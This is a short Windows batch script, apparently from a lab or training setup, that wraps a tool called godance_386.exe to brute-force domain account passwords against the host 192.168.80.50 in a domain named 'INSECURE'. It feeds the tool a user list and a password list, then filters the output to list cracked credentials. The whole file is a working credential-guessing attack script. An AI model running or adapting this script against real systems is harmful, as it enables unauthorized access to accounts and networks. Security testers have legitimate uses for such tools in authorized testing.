
@echo off 

:: set these variables first before running the script 

set "userlist=users.txt"
set target=192.168.80.50
set "domain=INSECURE"


:: password 
godance_386.exe -d %domain% -u %userlist% -w pass_password.txt -h %target% > godance_brute_bat.txt
powershell "Get-Content godance_brute_bat.txt | findstr hacker | sort-object| Get-Unique > godance_brute_cracked_bat.txt"

echo ""
echo ""
echo "################ FINISHED ################"
echo ""
type godance_brute_cracked_bat.txt